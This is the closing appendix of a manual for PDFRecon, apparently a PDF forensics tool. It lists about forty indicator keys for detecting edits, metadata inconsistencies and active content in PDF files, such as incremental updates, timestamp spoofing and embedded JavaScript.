This manual and the forensic indicators are maintained with the PDFRecon project. For contributions, issues, or feature requests, use the GitHub repository.


---

## Appendix: Complete Indicator List

Overview of all technical forensic indicators.

| Indicator Key | Full Name |
|---|---|
| `HasXFAForm` | HasXFAForm |
| `HasDigitalSignature` | HasDigitalSignature |
| `MultipleStartxref` | MultipleStartxref |
| `IncrementalUpdates` | IncrementalUpdates |
| `Linearized` | Linearized |
| `LinearizedUpdated` | LinearizedUpdated |
| `HasRedactions` | HasRedactions |
| `HasAnnotations` | HasAnnotations |
| `HasPieceInfo` | HasPieceInfo |
| `HasAcroForm` | HasAcroForm |
| `AcroFormNeedAppearances` | AcroFormNeedAppearances |
| `ObjGenGtZero` | ObjGenGtZero |
| `TrailerIDChange` | TrailerIDChange |
| `XMPIDChange` | XMPIDChange |
| `XMPHistory` | XMPHistory |
| `MultipleCreators` | MultipleCreators |
| `MultipleProducers` | MultipleProducers |
| `CreateDateMismatch` | CreateDateMismatch |
| `ModifyDateMismatch` | ModifyDateMismatch |
| `MultipleFontSubsets` | MultipleFontSubsets |
| `OrphanedObjects` | OrphanedObjects |
| `MissingObjects` | MissingObjects |
| `LargeObjectNumberGaps` | LargeObjectNumberGaps |
| `HiddenAnnotations` | HiddenAnnotations |
| `TimestampSpoofing` | TimestampSpoofing |
| `SubmitFormAction` | SubmitFormAction |
| `LaunchShellAction` | LaunchShellAction |
| `ExtractedJavaScript` | ExtractedJavaScript |
| `TouchUp_TextEdit` | TouchUp_TextEdit |
| `ExifToolMismatch` | ExifToolMismatch |
| `SuspiciousObjectContent` | SuspiciousObjectContent |
| `HasLayers` | HasLayers |
| `MoreLayersThanPages` | MoreLayersThanPages |
| `ColorProfileMismatch` | ColorProfileMismatch |
| `HighDefImage` | HighDefImage |
| `HiddenText` | HiddenText |
| `XMPHistoryGap` | XMPHistoryGap |
| `StructuralScrubbing` | StructuralScrubbing |
| `PDFAViolation` | PDFAViolation |
| `RelatedFiles` | RelatedFiles |
